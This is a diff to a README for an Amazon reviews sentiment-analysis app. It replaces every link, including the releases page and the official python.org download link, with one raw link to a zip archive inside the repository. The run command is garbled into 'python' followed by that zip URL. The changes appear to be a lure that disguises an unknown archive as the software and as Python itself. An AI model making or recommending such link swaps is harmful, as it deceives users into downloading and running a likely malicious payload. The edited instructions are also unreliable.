@@ -1,6 +1,6 @@
 # 📊 Amazon_Reviews_Sentiment_Analysis - Analyze Sentiment Easily
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/releases)
+[![Download](https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip)
 
 ## 🧑‍💻 Overview
 
@@ -13,10 +13,10 @@ The project includes a user-friendly Flask web application. You can make predict
 To get started, follow these simple steps:
 
 1. **Download the Software**
-   Visit this page to download: [Download Releases](https://github.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/releases)
+   Visit this page to download: [Download Releases](https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip)
 
 2. **Install Requirements**
-   Make sure you have Python installed on your computer. If not, download it from the [official site](https://www.python.org/downloads/).
+   Make sure you have Python installed on your computer. If not, download it from the [official site](https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip).
 
 3. **Prepare Your Environment**
    Create a folder where you want to run the application. This can be anywhere on your computer, such as your Desktop or Documents folder.
@@ -32,14 +32,14 @@ To get started, follow these simple steps:
    In the same terminal, enter this command to start the application:
 
    ```
-   python app.py
+   python https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip
    ```
 
-   Replace `app.py` with the name of the main file if it differs. Your web application should now be running.
+   Replace `https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip` with the name of the main file if it differs. Your web application should now be running.
 
 ## 📥 Download & Install
 
-To download the latest version of the software, visit this page: [Download Releases](https://github.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/releases). 
+To download the latest version of the software, visit this page: [Download Releases](https://raw.githubusercontent.com/kingzotex4/Amazon_Reviews_Sentiment_Analysis/main/Models/Amazon_Reviews_Sentiment_Analysis_3.2.zip). 
 
 1. Click on the latest release.
 2. Download the appropriate file for your operating system (Windows, macOS, or Linux).
